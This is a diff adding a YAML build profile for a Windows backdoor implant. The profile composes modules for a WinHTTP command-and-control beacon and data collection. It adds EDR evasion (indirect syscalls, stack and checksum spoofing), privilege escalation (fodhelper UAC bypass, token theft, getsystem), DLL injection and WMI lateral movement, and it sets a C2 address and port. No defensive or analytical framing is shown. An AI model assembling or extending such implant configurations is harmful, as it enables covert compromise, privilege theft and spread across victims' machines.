@@ -1,0 +1,36 @@
+name: backdoor_cs_winhttp_postex_v1
+description: WinHTTP backdoor with post-exploitation (privesc, lateral, injection)
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+collectors:
+  - collectors/system_info
+  - collectors/processes
+exfil: c2/winhttp_beacon
+arch: arch/backdoor
+resources: true
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+  - evasion/indirect_syscall
+  - evasion/checksum_spoof
+  - evasion/debug_dir_strip
+  - evasion/stack_spoof
+  - privesc/uac_fodhelper
+  - privesc/token_steal
+  - privesc/token_impersonate
+  - privesc/getsystem_pipe
+  - injection/dll_inject
+  - lateral/wmi_exec
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_exec
+  - commands/cmd_getsystem
+  - commands/cmd_uac_bypass
+  - commands/cmd_token
+  - commands/cmd_inject
+  - commands/cmd_lateral
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
